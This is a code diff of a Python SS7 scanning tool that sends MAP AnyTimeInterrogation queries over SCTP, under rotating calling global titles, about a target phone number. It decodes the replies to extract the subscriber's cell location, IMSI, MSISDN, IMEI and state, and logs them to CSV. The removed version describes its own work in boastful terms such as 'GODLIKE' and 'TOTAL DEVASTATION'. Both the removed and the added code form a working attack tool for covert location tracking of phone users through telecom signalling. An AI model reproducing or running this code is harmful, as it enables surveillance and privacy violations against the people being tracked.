-                        if high_nibble <= 9 and high_nibble != 0xF:
-                            msisdn_digits.append(str(high_nibble))
-                    
-                    if len(msisdn_digits) >= 10:
-                        msisdn = ''.join(msisdn_digits)
-                        
-                        # Validate MSISDN (should be reasonable length)
-                        if 10 <= len(msisdn) <= 15:
-                            return msisdn
-        except:
+                        # Validate reasonable values
+                        if 100 <= int(mcc) <= 999 and 0 <= int(mnc) <= 999 and 0 < lac < 65536 and 0 < ci < 65536:
+                            location = EnhancedLocationInfo()
+                            location.mcc = mcc
+                            location.mnc = mnc
+                            location.lac = str(lac)
+                            location.cell_id = str(ci)
+                            location.cgi_found = True
+                            
+                            if logger:
+                                logger.info(f"[{unique_id}] CGI found: MCC={mcc}, MNC={mnc}, LAC={lac}, CI={ci}")
+                            return location
+                    except Exception:
+                        continue
+        
+        except Exception:
             continue
     
     return None
 
-def extract_legendary_imei(data: bytes, unique_id: str) -> Optional[str]:
-    """Extract IMEI with DEMONIC persistence"""
+def decode_ati_response_professional(response_data: bytes, unique_id: str) -> Optional[ScanResult]:
+    """Professional MAP ATI response decoder"""
     
-    # IMEI is 15 digits in TBCD format
-    for i in range(len(data) - 7):
-        try:
-            if i + 8 <= len(data):
-                imei_bytes = data[i:i+8]
-                
-                # Decode TBCD
-                imei_digits = []
-                for byte in imei_bytes:
-                    low_nibble = byte & 0x0F
-                    high_nibble = (byte >> 4) & 0x0F
-                    
-                    if low_nibble <= 9:
-                        imei_digits.append(str(low_nibble))
-                    if high_nibble <= 9 and high_nibble != 0xF:
-                        imei_digits.append(str(high_nibble))
-                
-                if len(imei_digits) == 15:
-                    imei = ''.join(imei_digits)
-                    
-                    # Basic IMEI validation (should not be all zeros or ones)
-                    if not all(d == '0' for d in imei) and not all(d == '1' for d in imei):
-                        return imei
-        except:
-            continue
-    
-    return None
-
-def analyze_tcap_components(data: bytes, unique_id: str) -> Optional[dict]:
-    """Analyze TCAP components with LEGENDARY precision"""
+    if not response_data or len(response_data) < 4:
+        return None
     
     try:
-        # Look for TCAP component tags
-        tcap_tags = {
-            0xA1: "Invoke",
-            0xA2: "ReturnResultLast", 
-            0xA3: "ReturnError",
-            0xA4: "Reject"
-        }
+        if logger:
+            logger.debug(f"[{unique_id}] ATI response decoding started")
         
-        for i in range(len(data) - 1):
-            tag = data[i]
-            if tag in tcap_tags:
-                component_type = tcap_tags[tag]
-                
-                if component_type == "ReturnResultLast":
-                    return {
-                        "outcome": "ReturnResultLast",
-                        "info": "Successful MAP response received"
-                    }
-                elif component_type == "ReturnError":
-                    # Try to extract error code
-                    error_code = extract_map_error_code(data[i:], unique_id)
-                    return {
-                        "outcome": "ReturnError", 
-                        "info": f"MAP Error: {error_code}" if error_code else "MAP Error occurred"
-                    }
-                elif component_type == "Reject":
-                    return {
-                        "outcome": "Reject",
-                        "info": "TCAP Reject received"
-                    }
+        result = ScanResult()
+        result.parsed_data_size = len(response_data)
         
-        return {
-            "outcome": "UnknownResponse",
-            "info": "Response received but format unknown"
-        }
+        # Try Pycrate decoding first
+        if PYCRATE['MAP_defs'] is not None:
+            MAP_MS_DataTypes = getattr(PYCRATE['MAP_defs'], 'MAP_MS_DataTypes', None)
+            if MAP_MS_DataTypes:
+                AtiResType = getattr(MAP_MS_DataTypes, 'AnyTimeInterrogationRes', None)
+                if AtiResType:
+                    try:
+                        ati_response = deepcopy(AtiResType)
+                        ati_response.from_ber(response_data)
+                        response_val = ati_response.get_val()
+                        
+                        if logger:
+                            logger.info(f"[{unique_id}] MAP response decoded successfully")
+                        
+                        # Extract location information
+                        if 'locationInformation' in response_val:
+                            result.location_info = parse_location_information_professional(
+                                response_val['locationInformation'], unique_id
+                            )
+                        
+                        # Extract subscriber information  
+                        if 'subscriberInfo' in response_val:
+                            result.subscriber_info = parse_subscriber_info_professional(
+                                response_val['subscriberInfo'], unique_id
+                            )
+                        
+                        result.map_version = "v3"
+                        result.success = True
+                        
+                        return result
+                        
+                    except Exception as decode_error:
+                        if logger:
+                            logger.debug(f"[{unique_id}] Pycrate decode error: {decode_error}")
+    
+    except Exception as e:
+        if logger:
+            logger.debug(f"[{unique_id}] ATI response parsing failed: {e}")
+    
+    return None
+
+def parse_location_information_professional(location_data: Any, unique_id: str) -> EnhancedLocationInfo:
+    """Professional location information parser"""
+    
+    location = EnhancedLocationInfo()
+    
+    try:
+        if isinstance(location_data, dict):
+            # Parse Cell Global Identity
+            if 'cellGlobalIdOrServiceAreaIdOrLAI' in location_data:
+                cgi_data = location_data['cellGlobalIdOrServiceAreaIdOrLAI']
+                if isinstance(cgi_data, tuple) and len(cgi_data) >= 2:
+                    cgi_type, cgi_value = cgi_data[0], cgi_data[1]
+                    
+                    if cgi_type == 'cellGlobalIdOrServiceAreaIdFixedLength' and len(cgi_value) >= 7:
+                        try:
+                            mcc, mnc = decode_plmn_professional(cgi_value[:3])
+                            location.mcc = mcc
+                            location.mnc = mnc
+                            location.lac = str(int.from_bytes(cgi_value[3:5], 'big'))
+                            location.cell_id = str(int.from_bytes(cgi_value[5:7], 'big'))
+                            location.cgi_found = True
+                            
+                            if logger:
+                                logger.info(f"[{unique_id}] CGI: MCC={mcc}, MNC={mnc}, LAC={location.lac}, CI={location.cell_id}")
+                        except Exception as e:
+                            if logger:
+                                logger.debug(f"[{unique_id}] CGI parsing error: {e}")
+            
+            # Parse VLR number
+            if 'vlr-number' in location_data:
+                vlr_data = location_data['vlr-number']
+                if isinstance(vlr_data, bytes):
+                    location.vlr_name = decode_tbcd_string(vlr_data[1:])
+            
+            # Parse MSC number
+            if 'msc-number' in location_data:
+                msc_data = location_data['msc-number']
+                if isinstance(msc_data, bytes):
+                    location.msc_name = decode_tbcd_string(msc_data[1:])
+            
+            # Parse location age
+            if 'ageOfLocationInformation' in location_data:
+                location.location_age = str(location_data['ageOfLocationInformation'])
+            
+            # Parse geographical information
+            if 'geographicalInformation' in location_data:
+                geo_data = location_data['geographicalInformation']
+                if isinstance(geo_data, bytes):
+                    location.geographical_info = geo_data.hex()
+            
+            # Parse SGSN number
+            if 'sgsn-number' in location_data:
+                sgsn_data = location_data['sgsn-number']
+                if isinstance(sgsn_data, bytes):
+                    location.sgsn_name = decode_tbcd_string(sgsn_data[1:])
+            
+            # Set success flags
+            if location.mcc != "N/A" and location.mnc != "N/A":
+                if location.cell_id != "N/A":
+                    location.cgi_found = True
+                else:
+                    location.lai_found = True
         
     except Exception as e:
-        return None
+        if logger:
+            logger.debug(f"[{unique_id}] Location parsing error: {e}")
+    
+    return location
 
-def extract_map_error_code(data: bytes, unique_id: str) -> Optional[int]:
-    """Extract MAP error code from response"""
+def parse_subscriber_info_professional(subscriber_data: Any, unique_id: str) -> EnhancedSubscriberInfo:
+    """Professional subscriber information parser"""
+    
+    subscriber = EnhancedSubscriberInfo()
     
     try:
-        # Look for INTEGER tag followed by error code
-        for i in range(len(data) - 2):
-            if data[i] == 0x02 and data[i+1] == 0x01:  # INTEGER, length 1
-                error_code = data[i+2]
-                return error_code
-    except:
-        pass
+        if isinstance(subscriber_data, dict):
+            # Parse IMSI
+            if 'imsi' in subscriber_data:
+                imsi_data = subscriber_data['imsi']
+                if isinstance(imsi_data, bytes):
+                    subscriber.imsi = decode_tbcd_string(imsi_data)
+            
+            # Parse MSISDN
+            if 'msisdn' in subscriber_data:
+                msisdn_data = subscriber_data['msisdn']
+                if isinstance(msisdn_data, bytes):
+                    subscriber.msisdn = decode_tbcd_string(msisdn_data[1:])
+            
+            # Parse IMEI
+            if 'imei' in subscriber_data:
+                imei_data = subscriber_data['imei']
+                if isinstance(imei_data, bytes):
+                    subscriber.imei = decode_tbcd_string(imei_data)
+            
+            # Parse subscriber state
+            if 'subscriberState' in subscriber_data:
+                state_data = subscriber_data['subscriberState']
+                if isinstance(state_data, tuple) and len(state_data) >= 2:
+                    state_type, state_value = state_data[0], state_data[1]
+                    subscriber.subscriber_state = f"{state_type}: {state_value}"
+                elif isinstance(state_data, int):
+                    states = {0: "assumedIdle", 1: "camelBusy", 2: "notProvidedFromVLR"}
+                    subscriber.subscriber_state = states.get(state_data, f"unknown({state_data})")
+            
+            if logger:
+                logger.info(f"[{unique_id}] Subscriber info: IMSI={subscriber.imsi}, State={subscriber.subscriber_state}")
     
-    return None
+    except Exception as e:
+        if logger:
+            logger.debug(f"[{unique_id}] Subscriber parsing error: {e}")
+    
+    return subscriber
 
-def calculate_location_power(location_info: LegendaryLocationInfo) -> int:
-    """Calculate location extraction power level"""
-    
-    power = 0
-    
-    if location_info.mcc != "N/A":
-        power += 100
-    if location_info.mnc != "N/A":
-        power += 100
-    if location_info.lac != "N/A":
-        power += 200
-    if location_info.cell_id != "N/A":
-        power += 500
-    if location_info.cgi_found:
-        power += 1000
-    
-    return power
+# === Professional Display Functions ===
 
-def calculate_subscriber_power(subscriber_info: LegendarySubscriberInfo) -> int:
-    """Calculate subscriber extraction power level"""
+def display_professional_result(result: ScanResult, unique_id: str):
+    """Display scan result in elegant boxes with professional formatting"""
     
-    power = 0
+    # Determine status and colors
+    if result.location_info.cgi_found and result.subscriber_info.imsi != "N/A":
+        status_color = Colors.BRIGHT_GREEN
+        status_emoji = "🎯"
+        status_text = "FULL SUCCESS - COMPLETE DATA EXTRACTION"
+    elif result.location_info.cgi_found:
+        status_color = Colors.GREEN
+        status_emoji = "📍"
+        status_text = "LOCATION SUCCESS - CGI EXTRACTED"
+    elif result.subscriber_info.imsi != "N/A":
+        status_color = Colors.CYAN
+        status_emoji = "📱"
+        status_text = "SUBSCRIBER SUCCESS - IMSI EXTRACTED"
+    elif result.success:
+        status_color = Colors.BLUE
+        status_emoji = "✅"
+        status_text = "PARTIAL SUCCESS"
+    elif 'Timeout' in result.tcap_outcome:
+        status_color = Colors.YELLOW
+        status_emoji = "⏰"
+        status_text = "TIMEOUT"
+    elif 'Error' in result.tcap_outcome:
+        status_color = Colors.BRIGHT_RED
+        status_emoji = "❌"
+        status_text = "MAP ERROR"
+    elif 'Reject' in result.tcap_outcome:
+        status_color = Colors.RED
+        status_emoji = "🚫"
+        status_text = "TCAP REJECTED"
+    elif 'Abort' in result.tcap_outcome:
+        status_color = Colors.RED
+        status_emoji = "🔴"
+        status_text = "TCAP ABORTED"
+    else:
+        status_color = Colors.WHITE
+        status_emoji = "❓"
+        status_text = "UNKNOWN STATUS"
     
-    if subscriber_info.imsi != "N/A":
-        power += 2000
-    if subscriber_info.msisdn != "N/A":
-        power += 1500
-    if subscriber_info.imei != "N/A":
-        power += 1000
-    
-    return power
+    with terminal_lock:
+        # Main result box
+        result_content = [
+            f"{status_emoji} {result.ip}:{result.port} - {status_text}",
+            f"🕐 Timestamp: {result.timestamp}",
+            f"⏱️  Duration: {result.duration_ms:.2f}ms",
+            f"🔄 TCAP Outcome: {result.tcap_outcome}",
+            f"📡 MAP Version: {result.map_version}"
+        ]
+        
+        if result.error_info != "N/A":
+            result_content.append(f"⚠️  Error Info: {result.error_info}")
+        
+        if result.rejection_cause != "N/A":
+            result_content.append(f"🚫 Rejection: {result.rejection_cause}")
+        
+        print_elegant_box(f"SCAN RESULT [{unique_id}]", result_content, 
+                         status_color, Colors.BRIGHT_WHITE, Colors.WHITE)
+        
+        # Location Information Box
+        if result.location_info and (result.location_info.cgi_found or result.location_info.lai_found):
+            location_content = []
+            if result.location_info.cgi_found:
+                location_content.extend([
+                    f"🏢 Cell Global Identity (CGI):",
+                    f"   📍 MCC: {result.location_info.mcc}",
+                    f"   📍 MNC: {result.location_info.mnc}",
+                    f"   📍 LAC: {result.location_info.lac}",
+                    f"   📍 Cell ID: {result.location_info.cell_id}"
+                ])
+            
+            if result.location_info.vlr_name != "N/A":
+                location_content.append(f"📞 VLR Number: {result.location_info.vlr_name}")
+            if result.location_info.msc_name != "N/A":
+                location_content.append(f"📞 MSC Number: {result.location_info.msc_name}")
+            if result.location_info.sgsn_name != "N/A":
+                location_content.append(f"📞 SGSN Number: {result.location_info.sgsn_name}")
+            if result.location_info.location_age != "N/A":
+                location_content.append(f"⏰ Location Age: {result.location_info.location_age}")
+            
+            print_elegant_box("LOCATION INFORMATION", location_content, 
+                             Colors.BRIGHT_GREEN, Colors.BRIGHT_WHITE, Colors.WHITE)
+        
+        # Subscriber Information Box
+        if result.subscriber_info and (result.subscriber_info.imsi != "N/A" or 
+                                     result.subscriber_info.subscriber_state != "N/A"):
+            subscriber_content = []
+            if result.subscriber_info.imsi != "N/A":
+                subscriber_content.append(f"🔢 IMSI: {result.subscriber_info.imsi}")
+            if result.subscriber_info.msisdn != "N/A":
+                subscriber_content.append(f"📞 MSISDN: {result.subscriber_info.msisdn}")
+            if result.subscriber_info.imei != "N/A":
+                subscriber_content.append(f"📱 IMEI: {result.subscriber_info.imei}")
+            if result.subscriber_info.subscriber_state != "N/A":
+                subscriber_content.append(f"📊 State: {result.subscriber_info.subscriber_state}")
+            if result.subscriber_info.equipment_status != "N/A":
+                subscriber_content.append(f"🔧 Equipment: {result.subscriber_info.equipment_status}")
+            
+            print_elegant_box("SUBSCRIBER INFORMATION", subscriber_content, 
+                             Colors.BRIGHT_MAGENTA, Colors.BRIGHT_WHITE, Colors.WHITE)
+        
+        # Technical Details Box
+        technical_content = [
+            f"📤 Bytes Sent: {result.bytes_sent}",
+            f"📥 Bytes Received: {result.bytes_received}",
+            f"🕐 Connection Time: {result.connection_time_ms:.2f}ms",
+            f"🕐 Response Time: {result.response_time_ms:.2f}ms",
+            f"🎯 Used SSN: {result.used_cgpa_ssn}",
+            f"📡 Used GT: {result.used_cgpa_gt}"
+        ]
+        
+        print_elegant_box("TECHNICAL DETAILS", technical_content, 
+                         Colors.BRIGHT_BLUE, Colors.BRIGHT_WHITE, Colors.WHITE)
 
-# === 💀 LEGENDARY SCAN EXECUTOR ===
+def update_professional_statistics(result: ScanResult, start_time: float):
+    """Update professional statistics with comprehensive metrics"""
+    with stats_lock:
+        PROFESSIONAL_STATS['total_attempts'] += 1
+        
+        if result.success:
+            PROFESSIONAL_STATS['successful_responses'] += 1
+        
+        if result.location_info and result.location_info.cgi_found:
+            PROFESSIONAL_STATS['location_extractions'] += 1
+        
+        if result.subscriber_info and result.subscriber_info.imsi != "N/A":
+            PROFESSIONAL_STATS['imsi_extractions'] += 1
+        
+        if (result.location_info and result.location_info.cgi_found and 
+            result.subscriber_info and result.subscriber_info.imsi != "N/A"):
+            PROFESSIONAL_STATS['full_info_extractions'] += 1
+        
+        # Error tracking
+        if 'Timeout' in result.tcap_outcome:
+            PROFESSIONAL_STATS['timeouts'] += 1
+        elif 'Error' in result.tcap_outcome:
+            PROFESSIONAL_STATS['map_errors'] += 1
+        elif 'Reject' in result.tcap_outcome:
+            PROFESSIONAL_STATS['tcap_rejects'] += 1
+        elif 'Abort' in result.tcap_outcome:
+            PROFESSIONAL_STATS['tcap_aborts'] += 1
+        elif not result.success:
+            PROFESSIONAL_STATS['connection_errors'] += 1
+        
+        # Response time tracking
+        response_time = result.response_time_ms
+        if response_time > 0:
+            if response_time < PROFESSIONAL_STATS['fastest_response']:
+                PROFESSIONAL_STATS['fastest_response'] = response_time
+            if response_time > PROFESSIONAL_STATS['slowest_response']:
+                PROFESSIONAL_STATS['slowest_response'] = response_time
+        
+        # Error breakdown
+        if result.error_info != "N/A":
+            PROFESSIONAL_STATS['error_breakdown'][result.error_info] += 1
+        
+        # Calculate rates
+        total = PROFESSIONAL_STATS['total_attempts']
+        if total > 0:
+            PROFESSIONAL_STATS['success_rate'] = (PROFESSIONAL_STATS['successful_responses'] / total) * 100
 
-def execute_legendary_scan(ip: str, port: int, target_msisdn: str, attempt_num: int = 1) -> DestroyerScanResult:
-    """
-    Execute scan with GODLIKE power and SUPERNATURAL precision
-    This function OBLITERATES all obstacles and GUARANTEES results
-    """
+def save_result_to_csv(result: ScanResult, csv_file: Path):
+    """Save scan result to CSV with comprehensive data"""
+    with main_csv_lock:
+        file_exists = csv_file.exists()
+        
+        with open(csv_file, 'a', newline='', encoding='utf-8') as f:
+            fieldnames = [
+                'timestamp', 'ip', 'port', 'success', 'tcap_outcome', 'duration_ms',
+                'mcc', 'mnc', 'lac', 'cell_id', 'imsi', 'msisdn', 'imei',
+                'subscriber_state', 'vlr_number', 'msc_number', 'location_age',
+                'error_info', 'rejection_cause', 'map_version', 'bytes_sent',
+                'bytes_received', 'connection_time_ms', 'response_time_ms',
+                'used_ssn', 'used_gt', 'raw_response_hex'
+            ]
+            
+            writer = csv.DictWriter(f, fieldnames=fieldnames)
+            
+            if not file_exists:
+                writer.writeheader()
+            
+            # Prepare row data
+            row_data = {
+                'timestamp': result.timestamp,
+                'ip': result.ip,
+                'port': result.port,
+                'success': result.success,
+                'tcap_outcome': result.tcap_outcome,
+                'duration_ms': result.duration_ms,
+                'error_info': result.error_info,
+                'rejection_cause': result.rejection_cause,
+                'map_version': result.map_version,
+                'bytes_sent': result.bytes_sent,
+                'bytes_received': result.bytes_received,
+                'connection_time_ms': result.connection_time_ms,
+                'response_time_ms': result.response_time_ms,
+                'used_ssn': result.used_cgpa_ssn,
+                'used_gt': result.used_cgpa_gt,
+                'raw_response_hex': result.raw_response_hex[:1000]  # Limit length
+            }
+            
+            # Add location data
+            if result.location_info:
+                row_data.update({
+                    'mcc': result.location_info.mcc,
+                    'mnc': result.location_info.mnc,
+                    'lac': result.location_info.lac,
+                    'cell_id': result.location_info.cell_id,
+                    'vlr_number': result.location_info.vlr_name,
+                    'msc_number': result.location_info.msc_name,
+                    'location_age': result.location_info.location_age
+                })
+            
+            # Add subscriber data
+            if result.subscriber_info:
+                row_data.update({
+                    'imsi': result.subscriber_info.imsi,
+                    'msisdn': result.subscriber_info.msisdn,
+                    'imei': result.subscriber_info.imei,
+                    'subscriber_state': result.subscriber_info.subscriber_state
+                })
+            
+            writer.writerow(row_data)
+
+# === Professional Scanning Engine ===
+
+def scan_target_professional(ip: str, port: int, target_msisdn: str, 
+                           attempt_num: int = 1) -> ScanResult:
+    """Professional MAP-ATI scan with fixed transmission and enhanced debugging"""
     
     unique_id = f"{ip}:{port}:A{attempt_num}"
-    scan_start_time = time.time()
+    start_time = time.time()
     
-    legendary_print(f"🔥 INITIATING LEGENDARY SCAN: {unique_id}", 
-                   DestroyerColors.FIRE_RED, bold=True)
-    
-    # Create LEGENDARY scan result
-    result = DestroyerScanResult()
+    result = ScanResult()
     result.ip = ip
     result.port = port
-    result.timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    result.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    result.attempt_number = attempt_num
     
-    # Get LEGENDARY GT and SSN
-    cgpa_gt, gt_strategy = legendary_gt_pool.get_legendary_gt()
-    cgpa_ssn = random.choice(SCCP_DESTROYER_CONFIG['cgpa_ssn_pool'])
+    # Get random configuration
+    cgpa_ssn = random.choice(SCCP_PROFESSIONAL['cgpa_ssn_pool'])
+    cgpa_gt = gt_pool.get_next_gt()
+    ati_variant = random.choice(list(AtiVariant))
     
-    result.used_gt = cgpa_gt
-    result.used_ssn = cgpa_ssn
+    result.used_cgpa_ssn = cgpa_ssn
+    result.used_cgpa_gt = cgpa_gt
+    result.ati_variant_used = ati_variant.value
     
-    # Prepare SCCP config
-    sccp_config = SCCP_DESTROYER_CONFIG.copy()
+    # Update SCCP config for this scan
+    sccp_config = deepcopy(SCCP_PROFESSIONAL)
     sccp_config['cgpa_ssn'] = cgpa_ssn
-    
-    legendary_print(f"⚡ LEGENDARY parameters: GT={cgpa_gt}({gt_strategy}), SSN={cgpa_ssn}", 
-                   DestroyerColors.DIVINE_CYAN)
     
     sock = None
     
     try:
-        # === PHASE 1: SOCKET CREATION ===
-        legendary_print(f"🔧 PHASE 1: Creating LEGENDARY socket...", DestroyerColors.FIRE_ORANGE)
-        sock = create_legendary_socket()
+        print_connection_status(ip, port, "CONNECTING", unique_id=unique_id)
         
-        # === PHASE 2: CONNECTION ESTABLISHMENT ===
-        legendary_print(f"🔌 PHASE 2: Establishing DEMONIC connection...", DestroyerColors.FIRE_ORANGE)
-        connection_time = legendary_connect(sock, ip, port)
-        result.connection_time_ms = connection_time
+        # Create SCTP socket
+        sock = DEPS['sctp'].sctpsocket_tcp(socket.AF_INET)
+        sock.settimeout(PROFESSIONAL_CONFIG['connection_timeout'])
         
-        # === PHASE 3: PDU CONSTRUCTION ===
-        legendary_print(f"🔨 PHASE 3: FORGING LEGENDARY PDUs...", DestroyerColors.FIRE_ORANGE, bold=True)
+        # Connect
+        connect_start = time.time()
+        sock.connect((ip, port))
+        result.connection_time_ms = (time.time() - connect_start) * 1000
         
-        # Generate OTID with CHAOTIC randomness
+        print_connection_status(ip, port, "CONNECTED", 
+                              f"in {result.connection_time_ms:.1f}ms", unique_id=unique_id)
+        
+        # Build message
+        print_connection_status(ip, port, "BUILDING", 
+                              f"ATI {ati_variant.value} for {target_msisdn}", unique_id=unique_id)
+        
+        # Generate OTID
         otid = struct.pack('>I', random.randint(1000000, 9999999))
+        result.sent_otid = otid.hex()
         
-        # Select scan variant based on attempt
-        scan_variants = list(ScanVariant)
-        scan_variant = scan_variants[attempt_num % len(scan_variants)]
+        # Build TCAP message
+        print_colored(f"🔧 Building TCAP message for {unique_id}...", Colors.CYAN)
+        tcap_data = build_professional_tcap_message(otid, ati_variant, target_msisdn)
         
-        legendary_print(f"💀 Scan variant selected: {scan_variant.value}", DestroyerColors.MYTHIC_PURPLE)
+        if not tcap_data or len(tcap_data) == 0:
+            raise ValueError("TCAP message is empty!")
         
-        # Build LEGENDARY TCAP message
-        tcap_message = build_legendary_tcap_message(otid, scan_variant, target_msisdn)
-        result.pdu_construction_success = True
+        print_colored(f"✅ TCAP message built: {len(tcap_data)} bytes", Colors.GREEN)
         
-        # Build LEGENDARY SCCP message
-        sccp_message = build_legendary_sccp_message(target_msisdn, cgpa_gt, tcap_message, sccp_config)
+        # Build SCCP message
+        print_colored(f"🔧 Building SCCP message for {unique_id}...", Colors.CYAN)
+        sccp_message = build_fixed_sccp_message(target_msisdn, cgpa_gt, tcap_data, sccp_config)
         
-        legendary_print(f"⚡ PDU CONSTRUCTION COMPLETE: TCAP={len(tcap_message)}b, SCCP={len(sccp_message)}b", 
-                       DestroyerColors.GODLIKE_GREEN, bold=True)
+        if not sccp_message or len(sccp_message) == 0:
+            raise ValueError("SCCP message is empty!")
         
-        # === PHASE 4: LEGENDARY TRANSMISSION ===
-        legendary_print(f"📤 PHASE 4: EXECUTING LEGENDARY TRANSMISSION...", DestroyerColors.FIRE_RED, bold=True)
+        result.bytes_sent = len(sccp_message)
+        print_colored(f"✅ Ready to send {result.bytes_sent} bytes", Colors.GREEN)
         
-        transmission_start = time.time()
-        bytes_sent = legendary_transmission(sock, sccp_message, ip, port)
-        result.bytes_sent = bytes_sent
-        result.transmission_power = int(bytes_sent / ((time.time() - transmission_start) + 0.001))
+        # Send message
+        print_connection_status(ip, port, "SENDING", 
+                              f"{len(sccp_message)} bytes", unique_id=unique_id)
         
-        # === PHASE 5: RESPONSE RECEPTION ===
-        legendary_print(f"📥 PHASE 5: AWAITING LEGENDARY RESPONSE...", DestroyerColors.DESTROYER_BLUE)
+        sock.settimeout(PROFESSIONAL_CONFIG['response_timeout'])
         
-        response_data = legendary_reception(sock, ip, port)
-        result.response_time_ms = (time.time() - transmission_start) * 1000
+        send_start = time.time()
+        bytes_actually_sent = sock.send(sccp_message)
+        
+        print_colored(f"📤 Actually sent {bytes_actually_sent} bytes to {ip}:{port}", Colors.CYAN)
+        
+        if bytes_actually_sent != len(sccp_message):
+            print_colored(f"⚠️  Warning: Expected to send {len(sccp_message)} bytes, but sent {bytes_actually_sent}", 
+                         Colors.YELLOW)
+            result.bytes_sent = bytes_actually_sent
+        
+        if bytes_actually_sent == 0:
+            raise ValueError("No bytes were actually sent!")
+        
+        # Receive response
+        print_connection_status(ip, port, "RECEIVING", unique_id=unique_id)
+        
+        response_data = sock.recv(8192)
+        result.response_time_ms = (time.time() - send_start) * 1000
         
         if response_data:
-            result.bytes_received = len(response_data)
-            result.raw_response_hex = response_data.hex().upper()
+            print_connection_status(ip, port, "PARSING", 
+                                  f"received {len(response_data)} bytes", unique_id=unique_id)
             
-            # === PHASE 6: LEGENDARY ANALYSIS ===
-            legendary_print(f"🧠 PHASE 6: PERFORMING LEGENDARY ANALYSIS...", DestroyerColors.DESTROYER_BLUE, bold=True)
+            # Parse response
+            parsed_result = parse_response_professional(response_data, unique_id)
             
-            analysis_result = analyze_legendary_response(response_data, unique_id)
-            result.success = analysis_result["success"]
-            result.destruction_level = analysis_result["destruction_level"]
-            result.tcap_outcome = analysis_result["tcap_outcome"]
-            result.location_info = analysis_result["location_info"]
-            result.subscriber_info = analysis_result["subscriber_info"]
-            result.error_info = analysis_result["info"]
+            # Merge results
+            result.tcap_outcome = parsed_result.tcap_outcome
+            result.error_info = parsed_result.error_info
+            result.error_code = parsed_result.error_code
+            result.rejection_cause = parsed_result.rejection_cause
+            result.success = parsed_result.success
+            result.location_info = parsed_result.location_info
+            result.subscriber_info = parsed_result.subscriber_info
+            result.raw_response_hex = parsed_result.raw_response_hex
+            result.bytes_received = parsed_result.bytes_received
+            result.received_dtid = parsed_result.received_dtid
             
-            # Calculate TOTAL POWER LEVEL
-            total_power = (result.location_info.extraction_power + 
-                          result.subscriber_info.extraction_power + 
-                          result.transmission_power)
-            
-            if result.success:
-                legendary_print(f"💀 SCAN COMPLETED with TOTAL DEVASTATION! Power: {total_power}", 
-                               DestroyerColors.GODLIKE_GREEN, bold=True)
+            # Determine success level
+            if result.location_info.cgi_found and result.subscriber_info.imsi != "N/A":
+                print_connection_status(ip, port, "SUCCESS", 
+                                      "FULL DATA EXTRACTION", Colors.BRIGHT_GREEN, unique_id)
+            elif result.location_info.cgi_found:
+                print_connection_status(ip, port, "PARTIAL_SUCCESS", 
+                                      "LOCATION EXTRACTED", Colors.GREEN, unique_id)
+            elif result.subscriber_info.imsi != "N/A":
+                print_connection_status(ip, port, "PARTIAL_SUCCESS", 
+                                      "SUBSCRIBER DATA", Colors.CYAN, unique_id)
+            elif result.success:
+                print_connection_status(ip, port, "SUCCESS", 
+                                      "RESPONSE RECEIVED", Colors.BLUE, unique_id)
             else:
-                legendary_print(f"⚡ SCAN COMPLETED with PARTIAL SUCCESS! Power: {total_power}", 
-                               DestroyerColors.DIVINE_CYAN, bold=True)
+                print_connection_status(ip, port, "FAILED", 
+                                      result.error_info, Colors.RED, unique_id)
         else:
             result.tcap_outcome = 'NoResponse'
-            result.error_info = 'No response received after successful transmission'
-            legendary_print(f"⚠️  NO RESPONSE received - Target shows RESISTANCE", 
-                           DestroyerColors.FIRE_ORANGE, bold=True)
+            result.error_info = 'No response received'
+            result.rejection_cause = 'Empty response'
+            print_connection_status(ip, port, "ERROR", "No response", Colors.RED, unique_id)
     
     except socket.timeout:
         result.tcap_outcome = 'Timeout'
-        result.error_info = f'Socket timeout after {DESTROYER_CONFIG["response_timeout"]}s'
-        legendary_print(f"⏰ SCAN TIMEOUT: {ip}:{port} shows TEMPORAL RESISTANCE", 
-                       DestroyerColors.FIRE_ORANGE, bold=True)
+        result.error_info = f'Socket timeout after {PROFESSIONAL_CONFIG["response_timeout"]}s'
+        result.rejection_cause = 'Socket timeout'
+        print_connection_status(ip, port, "TIMEOUT", result.error_info, Colors.YELLOW, unique_id)
     
     except ConnectionRefusedError:
         result.tcap_outcome = 'ConnectionRefused'
-        result.error_info = 'Connection refused - port closed or filtered'
-        legendary_print(f"🚫 CONNECTION REFUSED: {ip}:{port} shows DEFENSIVE BARRIERS", 
-                       DestroyerColors.BLOOD_RED, bold=True)
+        result.error_info = 'Connection refused'
+        result.rejection_cause = 'Port closed or filtered'
+        print_connection_status(ip, port, "ERROR", "Connection refused", Colors.RED, unique_id)
     
     except Exception as e:
-        result.tcap_outcome = 'ScanError'
-        result.error_info = f'Scan error: {str(e)[:100]}'
-        legendary_print(f"💥 SCAN EXPLODED with error: {e}", DestroyerColors.LASER_RED, bold=True)
+        result.tcap_outcome = 'Exception'
+        result.error_info = f'Scan exception: {str(e)[:100]}'
+        result.rejection_cause = f'Exception: {type(e).__name__}'
+        print_connection_status(ip, port, "ERROR", str(e)[:50], Colors.RED, unique_id)
         
-        if legendary_logger:
-            legendary_logger.error(f"[{unique_id}] Legendary scan error: {e}", exc_info=True)
+        if logger:
+            logger.error(f"[{unique_id}] Scan exception: {e}")
+            logger.debug(f"[{unique_id}] Exception traceback:", exc_info=True)
     
     finally:
         if sock:
@@ -1646,229 +1910,36 @@ def execute_legendary_scan(ip: str, port: int, target_msisdn: str, attempt_num: 
             except:
                 pass
     
-    result.duration_ms = (time.time() - scan_start_time) * 1000
-    
-    # Update LEGENDARY statistics
-    update_destroyer_statistics(result)
-    
+    result.duration_ms = (time.time() - start_time) * 1000
     return result
 
-# === 📊 LEGENDARY STATISTICS MANAGER ===
-
-def update_destroyer_statistics(result: DestroyerScanResult):
-    """Update statistics with LEGENDARY precision"""
-    
-    with legendary_stats_lock:
-        DESTROYER_STATS['total_attempts'] += 1
-        
-        if result.pdu_construction_success:
-            DESTROYER_STATS['pdu_construction_successes'] += 1
-        else:
-            DESTROYER_STATS['pdu_construction_failures'] += 1
-        
-        if result.bytes_sent > 0:
-            DESTROYER_STATS['successful_transmissions'] += 1
-            DESTROYER_STATS['bytes_transmitted_total'] += result.bytes_sent
-        else:
-            DESTROYER_STATS['transmission_failures'] += 1
-        
-        if result.bytes_received > 0:
-            DESTROYER_STATS['bytes_received_total'] += result.bytes_received
-        
-        if result.success:
-            DESTROYER_STATS['successful_responses'] += 1
-        
-        if result.location_info.cgi_found:
-            DESTROYER_STATS['location_extractions'] += 1
-        
-        if result.subscriber_info.imsi != "N/A":
